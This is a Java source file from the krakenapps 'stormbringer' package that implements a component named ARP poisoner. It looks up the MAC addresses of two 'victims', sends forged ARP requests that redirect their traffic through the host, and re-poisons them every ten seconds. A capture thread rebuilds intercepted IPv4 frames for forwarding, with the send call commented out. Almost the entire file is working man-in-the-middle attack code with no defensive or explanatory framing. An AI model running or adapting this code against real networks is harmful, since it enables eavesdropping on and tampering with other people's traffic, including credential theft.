/*
 * Copyright 2010 NCHOVY
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 * http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
 package org.krakenapps.stormbringer.impl;

import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.felix.ipojo.annotations.Component;
import org.apache.felix.ipojo.annotations.Invalidate;
import org.apache.felix.ipojo.annotations.Provides;
import org.apache.felix.ipojo.annotations.Validate;
import org.krakenapps.pcap.decoder.arp.ArpPacket;
import org.krakenapps.pcap.decoder.arp.ArpProcessor;
import org.krakenapps.pcap.decoder.ethernet.EthernetFrame;
import org.krakenapps.pcap.decoder.ethernet.EthernetHeader;
import org.krakenapps.pcap.decoder.ethernet.EthernetProcessor;
import org.krakenapps.pcap.decoder.ethernet.EthernetType;
import org.krakenapps.pcap.decoder.ethernet.MacAddress;
import org.krakenapps.pcap.live.AddressBinding;
import org.krakenapps.pcap.live.PcapDevice;
import org.krakenapps.pcap.live.PcapDeviceManager;
import org.krakenapps.pcap.live.PcapDeviceMetadata;
import org.krakenapps.pcap.util.Arping;
import org.krakenapps.pcap.util.Buffer;
import org.krakenapps.pcap.util.IpConverter;
import org.krakenapps.pcap.util.PcapLiveRunner;
import org.krakenapps.stormbringer.ArpPoisoner;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Component(name = "arp-poisoner")
@Provides
public class ArpPoisonerImpl implements ArpPoisoner {
	private final Logger logger = LoggerFactory.getLogger(ArpPoisonerImpl.class.getName());

	private Set<MitmTarget> targets;
	private Map<InetAddress, MacAddress> hosts;

	private List<PcapDevice> devices;
	private List<PcapDeviceRunner> runners;

	private Thread t;
	private volatile boolean stopSignal;

	private InetAddress gateway;

	public ArpPoisonerImpl() {
		targets = Collections.synchronizedSet(new HashSet<MitmTarget>());
		hosts = new ConcurrentHashMap<InetAddress, MacAddress>();

		devices = Collections.synchronizedList(new ArrayList<PcapDevice>());
		runners = Collections.synchronizedList(new ArrayList<PcapDeviceRunner>());
	}

	@Validate
	public void start() {
		t = new Thread(this, "ARP Poisoner");
		t.start();
	}

	@Invalidate
	@Override
	public void stop() {
		stopSignal = true;
		t.interrupt();

		for (PcapDeviceRunner runner : runners)
			runner.stop();
	}

	@Override
	public void addAdapter(PcapDevice device) {
		PcapDeviceRunner runner = new PcapDeviceRunner(device);
		devices.add(device);
		runners.add(runner);

		Thread t = new Thread(runner, "ARP Poisoner's grabber");
		t.start();
	}

	@Override
	public void removeAdapter(PcapDevice device) {
		devices.remove(device);
	}

	@Override
	public void addTarget(InetAddress peer1, InetAddress peer2) {
		MacAddress mac1 = null;
		MacAddress mac2 = null;
		for (PcapDeviceMetadata metadata : PcapDeviceManager.getDeviceMetadataList()) {
			try {
				mac1 = Arping.query(metadata.getName(), peer1, 1000);
				mac2 = Arping.query(metadata.getName(), peer2, 1000);
			} catch (IOException e) {
			}

			if (mac1 != null && mac2 != null)
				break;
		}

		logger.info("victim1 ip: " + peer1 + ", mac: " + mac1);
		logger.info("victim2 ip: " + peer2 + ", mac: " + mac2);

		hosts.put(peer1, mac1);
		hosts.put(peer2, mac2);

		// poison attack
		sendMalformedRequest(peer1, peer2);

		targets.add(new MitmTarget(peer1, peer2));
	}

	@Override
	public void removeTarget(InetAddress peer1, InetAddress peer2) {
	}

	private void sendMalformedRequest(InetAddress peer1, InetAddress peer2) {
		MacAddress mac1 = hosts.get(peer1);
		MacAddress mac2 = hosts.get(peer2);

		for (PcapDevice device : devices) {
			MacAddress senderMac = device.getMetadata().getMacAddress();
			sendArpRequest(device, senderMac, peer2, mac1, peer1);
			sendArpRequest(device, senderMac, peer1, mac2, peer2);
		}
	}

	private void sendArpRequest(PcapDevice device, MacAddress senderMac, InetAddress senderIp, MacAddress targetMac,
			InetAddress targetIp) {
		ArpPacket p = ArpPacket.createRequest(senderMac, senderIp, targetMac, targetIp);
		EthernetHeader ethernetHeader = new EthernetHeader(senderMac, targetMac, EthernetType.ARP);
		EthernetFrame frame = new EthernetFrame(ethernetHeader, p.getBuffer());

		try {
			logger.debug("SEND==> " + p);
			device.write(frame.getBuffer());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run() {
		while (!stopSignal) {
			try {
				logger.debug("=========GO");
				attack();
				Thread.sleep(10 * 1000);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public void attack() {
		Map<InetAddress, MacAddress> hosts = getArpCache();

		for (PcapDevice device : devices) {
			for (MitmTarget target : targets) {
				MacAddress mac1 = hosts.get(target.peer1);
				MacAddress mac2 = hosts.get(target.peer2);
				try {
					attack(device, mac1, target.peer1, mac2, target.peer2);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}

	private void attack(PcapDevice device, MacAddress mac1, InetAddress peer1, MacAddress mac2, InetAddress peer2)
			throws IOException {
		sendArpRequest(device, device.getMetadata().getMacAddress(), peer2, mac1, peer1);
		sendArpRequest(device, device.getMetadata().getMacAddress(), peer1, mac2, peer2);
	}

	@Override
	public Map<InetAddress, MacAddress> getArpCache() {
		return new HashMap<InetAddress, MacAddress>(hosts);
	}

	@Override
	public void setGateway(InetAddress ip) {
		gateway = ip;
	}

	private class PcapDeviceRunner implements Runnable, EthernetProcessor, ArpProcessor {
		private Thread t;
		private PcapDevice device;
		private PcapLiveRunner runner;
		private MacAddress deviceMac;

		public PcapDeviceRunner(PcapDevice device) {
			this.device = device;
			this.deviceMac = device.getMetadata().getMacAddress();
		}

		@Override
		public void run() {
			t = Thread.currentThread();
			runner = new PcapLiveRunner(device);
			runner.getEthernetDecoder().register(EthernetType.IPV4, this);
			runner.getArpDecoder().register(this);
			runner.run();
		}

		public void stop() {
			runner.stop();
			t.interrupt();
		}

		@Override
		public void process(EthernetFrame frame) {
			Buffer buf = frame.getData();
			byte[] b = new byte[12];
			buf.gets(b);

			IpConverter.toInetAddress(buf.getInt());
			InetAddress dst = IpConverter.toInetAddress(buf.getInt());

			if (!frame.getSource().equals(deviceMac)) {
				MacAddress dstMac = hosts.get(dst);
				if (isForward(dstMac, dst)) {
					MacAddress newSource = device.getMetadata().getMacAddress();
					MacAddress newDestination = hosts.get(dst);
					if (newDestination == null)
						newDestination = hosts.get(gateway);

					if (newDestination != null) {
						frame.getData().rewind();
						EthernetFrame newFrame = new EthernetFrame(newSource, newDestination, frame.getType(),
								frame.getData());
//						try {
//							device.write(newFrame.getBuffer());
//							logger.debug("$ROUTE packet: " + frame + " to " + newFrame);
//						} catch (IOException e) {
//							e.printStackTrace();
//						}
					} else {
						logger.error("destination mac not found");
					}
				}
			}

			buf.rewind();
		}

		private boolean isForward(MacAddress dstMac, InetAddress dstIp) {
			for (AddressBinding binding : device.getMetadata().getBindings())
				if (binding.getAddress().equals(dstIp))
					return false;

			return (dstMac == null || !dstMac.equals(deviceMac));
		}

		@Override
		public void process(ArpPacket p) {
			logger.debug("|ARP =====> " + p);
			logger.debug("|Sender: " + p.getSenderIp() + " " + p.getSenderMac() + " Target: " + p.getTargetIp() + " "
					+ p.getTargetMac());
		}
	}

	static class MitmTarget {
		InetAddress peer1;
		InetAddress peer2;

		public MitmTarget(InetAddress peer1, InetAddress peer2) {
			this.peer1 = peer1;
			this.peer2 = peer2;
		}

		@Override
		public int hashCode() {
			final int prime = 31;
			int result = 1;
			result = prime * result + ((peer1 == null) ? 0 : peer1.hashCode());
			result = prime * result + ((peer2 == null) ? 0 : peer2.hashCode());
			return result;
		}

		@Override
		public boolean equals(Object obj) {
			if (this == obj)
				return true;
			if (obj == null)
				return false;
			if (getClass() != obj.getClass())
				return false;
			MitmTarget other = (MitmTarget) obj;
			if (peer1 == null) {
				if (other.peer1 != null)
					return false;
			} else if (!peer1.equals(other.peer1))
				return false;
			if (peer2 == null) {
				if (other.peer2 != null)
					return false;
			} else if (!peer2.equals(other.peer2))
				return false;
			return true;
		}
	}

}
